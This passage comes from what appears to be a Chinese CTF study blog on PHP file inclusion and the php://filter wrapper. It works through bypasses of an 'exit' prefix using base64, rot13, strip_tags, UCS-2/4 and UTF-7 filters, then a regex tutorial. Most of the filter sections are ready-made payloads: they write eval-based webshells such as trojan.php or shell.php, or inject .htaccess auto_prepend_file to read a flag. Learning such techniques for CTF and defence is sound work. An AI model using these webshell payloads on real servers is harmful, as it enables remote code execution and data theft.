+<h4 id="3-2-1-php-filter协议"><a href="#3-2-1-php-filter协议" class="headerlink" title="3.2.1 php://filter协议"></a>3.2.1 <code>php://filter</code>协议</h4><p><code>php://filter</code>可以获取指定文件的源码，当其与包含函数结合的时候，<code>php://filter</code>流会被当作PHP文件执行，故<strong>一般对其进行编码，不让其执行</strong>，从而导致任意文件读取</p>
+<p>该协议参数如下：</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>resource=&lt;要过滤的数据流&gt;</code></td>
+<td><strong>必须存在</strong>，指定要筛选过滤的数据流</td>
+</tr>
+<tr>
+<td><code>read=&lt;读链的筛选列表&gt;</code></td>
+<td><strong>可选</strong>，可设定一个或多个过滤器名称，用管道符&#96;</td>
+</tr>
+<tr>
+<td><code>write=&lt;写链的筛选列表&gt;</code></td>
+<td><strong>可选</strong>，可设定一个或多个过滤器名称，用管道符&#96;</td>
+</tr>
+<tr>
+<td><code>&lt;; 两个链的筛选列表&gt;</code></td>
+<td>任何没有以<code>read=</code>或<code>write=</code>为前缀的筛选器列表会视情况应用于读或写链</td>
+</tr>
+</tbody></table>
+<p>常用的过滤器如下：</p>
+<table>
+<thead>
+<tr>
+<th>字符串过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>string.rot13</code></td>
+<td>等同于<code>str_rot13()</code>，ROT13</td>
+</tr>
+<tr>
+<td><code>string.toupper</code></td>
+<td>等同于<code>strtoupper()</code>，转大写字母</td>
+</tr>
+<tr>
+<td><code>string.tolower</code></td>
+<td>等同于<code>strtolower()</code>，转小写字母</td>
+</tr>
+<tr>
+<td><code>string.strip_tags</code></td>
+<td>等同于<code>strip_tags()</code>，去除HTML、PHP语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>转换过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>convert.base64-encode</code>，<code>convert.base64-decode</code></td>
+<td>Base64编码解码</td>
+</tr>
+<tr>
+<td><code>convert.quoted-printable-encode</code>, <code>convert.quoted-printable-decode</code></td>
+<td>Quoted-Printable编码解码</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>压缩过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>zlib.deflate</code>, <code>zlib.inflate</code></td>
+<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分</td>
+</tr>
+<tr>
+<td><code>bzip2.compress</code>, <code>bzip2.decompress</code></td>
+<td>同上，在本地文件系统中创建 bz2 兼容文件的方法</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>加密过滤器</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>mcrypt.*</code></td>
+<td>libmcrypt对称加密</td>
+</tr>
+<tr>
+<td><code>mdecrypt.*</code></td>
+<td>libmcrypt对称解密</td>
+</tr>
+</tbody></table>
+<p>使用样例如下：</p>
+<ul>
+<li><p><code>php://filter/read=convert.base64-encode/resource=[filename]</code>（对于PHP文件需要进行编码防止其以PHP代码执行导致无回显或回显不是源码）</p>
+</li>
+<li><p><code>php://input + [POST DATA]</code>：使用<code>php://input</code>协议后在POST里的data输入PHP代码即可执行该代码，可以利用其写入一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#x27;trojan.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-3-死亡exit的绕过"><a href="#3-3-死亡exit的绕过" class="headerlink" title="3.3 死亡exit的绕过"></a>3.3 死亡exit的绕过</h3><p>死亡exit指在进行写入PHP文件操作时，执行了下面的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit(); ?&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// $content = &#x27;&lt;?php exit();&#x27;</span></span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>假如你写入的是一个一句话木马，最后文件的内容是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它在开头增加了exit过程，这样我们即使成功写入一句话也无法执行PHP代码，一般在缓存、配置文件等不允许用户直接访问的文件当中存在死亡exit</p>
+<h4 id="3-3-1-base64-decode绕过"><a href="#3-3-1-base64-decode绕过" class="headerlink" title="3.3.1 base64-decode绕过"></a>3.3.1 <code>base64-decode</code>绕过</h4><p>由于Base64编码只包含<code>A-Za-z0-9+/</code>一共64个可打印字符（<code>=</code>是作为一个Padding填充空位使用的，可以表结束），而PHP遇到不可解码的字符的时候会选择性的跳过，因此假设我们使用的是上面的例子，当我们使用<code>php://filter/convert.base64=decode</code>的时候，<code>&lt;?php exit(); &gt;</code>最后留下来的也就只有<code>phpexit</code>一共7个字符，而Base64解码是4字节转3字节，因此我们可以在构造的<code>$content</code>开头随意添加一个字符，从而使得exit被化解，而<code>$content</code>后面的则是我们的payload的Base64，这样我们就成功绕过了死亡exit</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-3-2-string-rot13绕过"><a href="#3-3-2-string-rot13绕过" class="headerlink" title="3.3.2 string.rot13绕过"></a>3.3.2 <code>string.rot13</code>绕过</h4><p>利用<code>string.rot13</code>编解码都是自身完成的这一特性去除exit，原先的<code>&lt;?php exit();</code>编码后会变成<code>&lt;?cuc rkvg();</code>，但是该绕过方法要求不开启<code>short_open_tag</code>，即关闭<code>&lt;? PHP语句 ?&gt;</code>缩写形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-3-3-string-strip-tags配合Base64绕过"><a href="#3-3-3-string-strip-tags配合Base64绕过" class="headerlink" title="3.3.3 string.strip_tags配合Base64绕过"></a>3.3.3 <code>string.strip_tags</code>配合Base64绕过</h4><p><code>strip_tags</code>会从字符串中去掉所有的空字符、HTML标记和PHP标记然后返回结果，比如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="string">&quot;He&lt;?php exit();?&gt;ck&quot;</span>);</span><br><span class="line"><span class="comment">// Output: Heck</span></span><br></pre></td></tr></table></figure>
+
+<p>那么我们可以利用这个去掉死亡exit，但是这样我们的Payload就不能以PHP标记的形式上传了，否则也会被去掉的</p>
+<p>那么我们可以利用上面的<code>base64-decode</code>进行绕过，利用管道符<code>|</code>分隔多个过滤器我们能够使用多个过滤器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-3-4-htaccess的预包含利用（待学习）"><a href="#3-3-4-htaccess的预包含利用（待学习）" class="headerlink" title="3.3.4 .htaccess的预包含利用（待学习）"></a>3.3.4 <code>.htaccess</code>的预包含利用（待学习）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file%20&quot;/flag&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-3-5-bypass相同变量"><a href="#3-3-5-bypass相同变量" class="headerlink" title="3.3.5 bypass相同变量"></a>3.3.5 bypass相同变量</h4><p>对于下面的源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[content];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<p>其写入的文件名和文件部分内容一致，利用难度增加，但是最终目的依旧是去除开头的<code>&lt;?php exit();</code></p>
+<h5 id="3-3-5-1-Base64绕过"><a href="#3-3-5-1-Base64绕过" class="headerlink" title="3.3.5.1 Base64绕过"></a>3.3.5.1 Base64绕过</h5><p>假如我们简单利用上面正常绕过的思路，可以得到下面的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br><span class="line"></span><br><span class="line">// File content below</span><br><span class="line">// base64decode(&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php)</span><br></pre></td></tr></table></figure>
+
+<p>所以我们就成功分解掉了exit代码，但是结果却是文件创建成功，但无法生成content，因为Base64里面<code>=</code>作填充，可以表示结束，而在<code>=</code>之后是不允许存在其它字符的，否则报错</p>
+<p>这里的写入content失败也正是这个原因，内容里面的<code>resource=</code>之后存在字符导致写入失败，所以我们想一个办法去掉这个等号就行，比如利用上面的<code>strip_tags</code>过滤器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</span><br></pre></td></tr></table></figure>
+
+<p>所以我们现在确实可以生成文件并写入shell了，但是我们使用浏览器会出现访问不到的问题，这个问题可以使用伪目录变相绕过去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php</span><br></pre></td></tr></table></figure>
+
+<p>这样我们进入一个不存在的目录后退出来然后生成了一个shell.php，这样就可以以正常的文件名访问了</p>
+<p>上面的做法是先闭合死亡exit然后用过滤器过滤标签，最后Base64解码，下面提供一种先解决Base64中<code>=</code>的问题，然后对死亡exit直接Base64解码从而达到分解代码的作用的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="3-3-5-2-string-rot13绕过"><a href="#3-3-5-2-string-rot13绕过" class="headerlink" title="3.3.5.2 string.rot13绕过"></a>3.3.5.2 <code>string.rot13</code>绕过</h5><p>考虑到上面的<code>=</code>引出的问题，我们可以利用ROT13这种不受限于这种字符的编码进行绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span><br><span class="line"></span><br><span class="line">content=php://filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</span><br></pre></td></tr></table></figure>
+
+<p>原理其实和上面正常情况的ROT13绕过一样</p>
+<h5 id="3-3-5-3-convert-iconv-绕过"><a href="#3-3-5-3-convert-iconv-绕过" class="headerlink" title="3.3.5.3 convert.iconv.*绕过"></a>3.3.5.3 <code>convert.iconv.*</code>绕过</h5><p>我们可以利用<code>iconv</code>字符编码转换进行绕过，其实就类似上面的Base64解码和ROT13解码，就是让系统无法识别死亡exit代码而我们的payload能正常存储解析</p>
+<h6 id="3-3-5-3-1-UCS-2绕过"><a href="#3-3-5-3-1-UCS-2绕过" class="headerlink" title="3.3.5.3.1 UCS-2绕过"></a>3.3.5.3.1 UCS-2绕过</h6><p>通过UCS-2方式，我们将我们的payload进行每2位一次翻转，所以我们要求<u>payload必须是UCS-2中2的倍数</u>（没懂，指的是payload长度必须是2的倍数吗？），不然多余的不满足的字符串会被截断，导致payload不完整，无法正常使用</p>
+<p>首先先对payload进行编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>payload如下，其中的BE和LE分别表示大端和小端，读取是从大端到小端进行读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最后写入的内容长这样：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[ab]);<span class="meta">?&gt;</span>r/seuocr=ehsle.lhp</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="3-3-5-3-2-UCS-4绕过"><a href="#3-3-5-3-2-UCS-4绕过" class="headerlink" title="3.3.5.3.2 UCS-4绕过"></a>3.3.5.3.2 UCS-4绕过</h6><p>和上面的UCS-2类似，只不过是进行每4位一次翻转，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>最后写入的内容长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hp?&lt;xe p)(tiphp;f//:etlioc/rrevnci.t.vno-SCU.EL4-SCU|EB4&lt;?php @eval($_POST[abcd]);?&gt;ser/cruohs=e.lle</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="3-3-5-3-3-UTF-8-UTF-7绕过"><a href="#3-3-5-3-3-UTF-8-UTF-7绕过" class="headerlink" title="3.3.5.3.3 UTF-8&amp;UTF-7绕过"></a>3.3.5.3.3 UTF-8&amp;UTF-7绕过</h6><p>由于我们对<code>=</code>进行UTF-7编码后得到了<code>+AD0-</code>这样的结果，这样我们就能绕过<code>=</code>的限制了：我们先将整个文件内容用UTF-7编码，然后再Base64解码就可以了（因为<code>+</code>经过UTF-7编码后为<code>+-</code>，不影响payload的解码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+<p>只是要注意你的payload和死亡exit拼接后经过UTF-7编码后payload前面一定要是4的整数倍个字符，否则会出问题，无法正常使用的</p>
+<h4 id="3-3-6-杂糅代码注释"><a href="#3-3-6-杂糅代码注释" class="headerlink" title="3.3.6 杂糅代码注释"></a>3.3.6 杂糅代码注释</h4><p>有的时候我们会遇到源码是这样的题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[content];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span> . <span class="string">&quot;\nxxxxx&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这样虽然不是死亡exit了，但是可能后面的杂糅代码会阻碍我们的步伐，因此我们需要将后面的代码注释或者分解掉，一般会在禁止有特殊起始符和结束符号的语言里面出现</p>
+<p>常见的考点是利用<code>.htaccess</code>进行操作，但是<code>.htaccess</code>对文件内容的格式非常敏感，有杂糅的字符就会出错，所以我们只能注释掉杂糅代码</p>
+<p>对于换行符直接进行<code>\</code>注释即可，然后嵌入<code>#</code>注释符进行单行注释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%20auto_prepend_file%20/var/www/html/flag%0A%23</span><br></pre></td></tr></table></figure>
+
+<p>但是要注意<strong>写入的.htaccess文件格式一定不能出问题，否则出发报错的话题目就会锁死</strong></p>
+<h2 id="4-外部命令执行函数"><a href="#4-外部命令执行函数" class="headerlink" title="4. 外部命令执行函数"></a>4. 外部命令执行函数</h2><p>有的时候我们需要使用到PHP执行外部命令的函数，以下提供4种方法</p>
+<h3 id="4-1-exec"><a href="#4-1-exec" class="headerlink" title="4.1 exec()"></a>4.1 <code>exec()</code></h3><h3 id="4-2-passthru"><a href="#4-2-passthru" class="headerlink" title="4.2 passthru()"></a>4.2 <code>passthru()</code></h3><h3 id="4-3-system"><a href="#4-3-system" class="headerlink" title="4.3 system()"></a>4.3 <code>system()</code></h3><h3 id="4-4-反撇号-和shell-exec"><a href="#4-4-反撇号-和shell-exec" class="headerlink" title="4.4 反撇号`和shell_exec()"></a>4.4 反撇号`和<code>shell_exec()</code></h3><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><p>想到啥写啥咯，我也不知道这部分放哪里，<del>总不能再水一篇博客是吧（</del></p>
+<h2 id="1-正则表达式-Regular-Expression"><a href="#1-正则表达式-Regular-Expression" class="headerlink" title="1. 正则表达式 (Regular Expression)"></a>1. 正则表达式 (Regular Expression)</h2><p>我不会写教程，所以下面就简单举些例子，主要怕我哪天忘了不会了（</p>
+<h3 id="1-1-位置与边界匹配"><a href="#1-1-位置与边界匹配" class="headerlink" title="1.1 位置与边界匹配"></a>1.1 位置与边界匹配</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/cat/g	=&gt; 匹配所有的cat，其中的g表示global，全局匹配</span><br><span class="line">/.at/g	=&gt; 匹配所有的*at，其中的*为除去换行符外的任意字符</span><br><span class="line">/[abs]at/g	=&gt; 匹配所有的aat，bat和sat，这里的方括号表示字符集合</span><br><span class="line">/[a-z]at/g	=&gt; 匹配所有的*at，这里的*为所有小写字母，方括号内的-表示范围</span><br><span class="line">/[^0-9]at/g	=&gt; 匹配所有的*at，这里的*表示除所有数字以外的任意字符，^在方括号内表示范围取反</span><br><span class="line">/^cat/gm	=&gt; 匹配每一行以cat开头的字符串，其中后面的m表示multiline，多行匹配（VSC和vim默认开启多行匹配）</span><br><span class="line">/\des/g	=&gt; 匹配所有*es，其中*为任意数字，\d属于预定义字符类，表示数字；而\D表示非数字</span><br><span class="line">/e\wb/g	=&gt; 匹配所有的e*b，这里的*为任意字母、数字或下划线，\w属于预定义字符类，表示字母、数字或下划线；\W则与\w范围相反</span><br><span class="line">/ye\s/g	=&gt; 匹配所有的ye*，这里的*为任意空白字符，\s属于预定义字符类，表示空白字符；\S则与\s范围相反</span><br><span class="line">/\.sh$/gm	=&gt; 匹配每一行以.sh结尾的字符串，由于.为特殊字符，需要反斜线转义</span><br><span class="line">/\bsh/gm	=&gt; 匹配所有只在单词开头的sh，\b表示单词边界，置于前面表单词开头，置于后面表单词结尾，同理可以使用\B表示范围取反</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-2-量词"><a href="#1-2-量词" class="headerlink" title="1.2 量词"></a>1.2 量词</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/yo+/gm	=&gt; 匹配所有y*，其中*为1个或多个o</span><br><span class="line">/yo*/gm	=&gt; 匹配所有y*，其中*为0个及以上数量的o</span><br><span class="line">/yo?/gm	=&gt; 匹配所有y*，其中*为0个或1个o</span><br><span class="line">/yo&#123;2,5&#125;/gm	=&gt; 匹配所有y*，其中*为2~5个o，花括号用于限定重复次数</span><br><span class="line">/yo&#123;2,&#125;/gm	=&gt; 匹配所有y*，其中*为2个以上的o</span><br><span class="line">/yo&#123;2,&#125;?/gm	=&gt; 非贪婪匹配，只匹配到所有y*，其中*为2个o</span><br><span class="line">/(web)*/gm	=&gt; 匹配所有*，其中*为0个及以上数量的web循环（即webwebweb这类），此处的括号()表分组</span><br><span class="line">/Web|web/gm	=&gt; 匹配所有的Web和web,分隔符|表或操作</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-3-分组和引用"><a href="#1-3-分组和引用" class="headerlink" title="1.3 分组和引用"></a>1.3 分组和引用</h3><h4 id="1-3-1-分组替换"><a href="#1-3-1-分组替换" class="headerlink" title="1.3.1 分组替换"></a>1.3.1 分组替换</h4><p>假如有一系列格式为<code>yyyy:mm:dd</code>格式的日期，需要将格式更改为<code>mm-dd-yyyy</code>，可以首先利用下面的Regex进行匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(\d&#123;4&#125;):(\d&#123;1,2&#125;):(\d&#123;1,2&#125;)/gm</span><br></pre></td></tr></table></figure>
+
+<p>然后使用下面的格式进行替换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$2-$3-$1</span><br></pre></td></tr></table></figure>
+
+<p>其中下面的<code>$1</code>表示第1个分组，即上面匹配的<code>(\d&#123;4&#125;)</code>，剩余的同理</p>
+<h4 id="1-3-2-非捕获分组"><a href="#1-3-2-非捕获分组" class="headerlink" title="1.3.2 非捕获分组"></a>1.3.2 非捕获分组</h4><p>有的时候我们不希望分组被捕获，比如上面的例子，假如我们不希望月份分组被捕获，那么我们可以将月份的分组里面添加<code>?:</code>表示该分组不捕获：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(\d&#123;4&#125;):(?:\d&#123;1,2&#125;):(\d&#123;1,2&#125;)/gm</span><br></pre></td></tr></table></figure>
+
+<p>这样<code>$2</code>就是日期分组了</p>
+<h4 id="1-3-3-分组的引用"><a href="#1-3-3-分组的引用" class="headerlink" title="1.3.3 分组的引用"></a>1.3.3 分组的引用</h4><p>假如我们需要匹配字符串（假定输入为全小写字母），要求开头和结尾的字符一致，那么我们可以用下面的Regex进行匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\b([a-z])[a-z]*\1\b/gm</span><br></pre></td></tr></table></figure>
+
+<p>其中的<code>\1</code>就是引用了第1个分组，也就是前面的<code>([a-z])</code></p>
+<h3 id="1-4-前瞻和后顾"><a href="#1-4-前瞻和后顾" class="headerlink" title="1.4 前瞻和后顾"></a>1.4 前瞻和后顾</h3><p>前瞻分为正向前瞻和负向前瞻，后顾也分为正向后顾和负向后顾，正向负向其实就和上面的大小写一样是一个范围取反的操作，下面就分别取两个例子解释前瞻和后顾：</p>
+<h4 id="1-4-1-正向前瞻-负向前瞻"><a href="#1-4-1-正向前瞻-负向前瞻" class="headerlink" title="1.4.1 正向前瞻&amp;负向前瞻"></a>1.4.1 正向前瞻&amp;负向前瞻</h4><p>假如我们有一系列数据，其中有诸如<code>$114514</code>表示金额的数据，有诸如<code>$a1d5g</code>这种表示变量的数据（假定只有数字就一定是金额，否则就是变量）</p>
+<p>假如我们希望匹配所有表示金额的数据里开头的<code>$</code>字符（只匹配满足条件的单个<code>$</code>字符），那么我们首先匹配表示金额的数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\$\d+/gm</span><br></pre></td></tr></table></figure>
+
+<p>接下来就利用正向前瞻匹配所有满足情况的<code>$</code>，首先我们将数字分组，然后再在分组内开头添加<code>?=</code>表示正向前瞻：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\$(?=\d+)/gm</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就成功匹配了所有表示金额数据中开头的<code>$</code>字符</p>
+<p>如果我们希望匹配的是所有变量的数据开头的<code>$</code>字符，那么我们可以利用负向前瞻实现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/\$(?!\d+)/gm</span><br></pre></td></tr></table></figure>
+
+<p>就是把<code>=</code>换成了<code>!</code>，相等改成了不等，很好理解吧~</p>
+<h4 id="1-4-2-正向后顾-负向后顾"><a href="#1-4-2-正向后顾-负向后顾" class="headerlink" title="1.4.2 正向后顾&amp;负向后顾"></a>1.4.2 正向后顾&amp;负向后顾</h4><p>前瞻是匹配某些字符前面的内容，那么后顾自然是匹配某些字符后面的东西，还是上面的例子，但是这次我们希望匹配的是金额，那么我们就可以这样匹配：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(?&lt;=\$)\d+/gm</span><br></pre></td></tr></table></figure>
+
+<p>里面的<code>?&lt;=</code>就是正向后顾，这样就能实现上面的操作，例子的具体解释的话就是如果前面是<code>$</code>字符而后面是数字，就匹配数字</p>
+<p>同理，我们将<code>=</code>改成<code>!</code>就变成了负向后顾：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(?&lt;!\$)\d+/gm</span><br></pre></td></tr></table></figure>
+
+<p>这样只要开头<strong>不是</strong><code>$</code>字符而且后面是数字，就匹配数字，比如<code>$1000</code>，匹配到的就是<code>000</code>，因为它会把<code>$1</code>看作一个满足条件的开头，所以如果希望排除这种情况我们就需要利用上面提到的边界字符<code>\b</code>进行限制了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/(?&lt;!\$)\b\d+\b/gm</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-5-版本问题"><a href="#1-5-版本问题" class="headerlink" title="1.5 版本问题"></a>1.5 版本问题</h3><p>目前的正则表达式有不同的版本：POSIX基本的BRE版本，POSIX扩展的ERE版本，Perl兼容的PCRE，还有Python、Java等自支持的其他版本，不同版本有不同特性，可能会和上面的例子有所不符，比如当前使用的Regex版本不支持对应表达式的特性</p>
+<h1 id="参考文章-网页"><a href="#参考文章-网页" class="headerlink" title="参考文章&#x2F;网页"></a>参考文章&#x2F;网页</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47804678/article/details/128814377">php比较绕过（强比较“===”&#x2F;弱比较“==“）_php强等于绕过-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46467017/article/details/126380415">文件包含漏洞全面详解-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/angry_program/article/details/107855078">目录穿越&#x2F;遍历漏洞 – 学习笔记_目录遍历漏洞描述-CSDN博客</a></p>
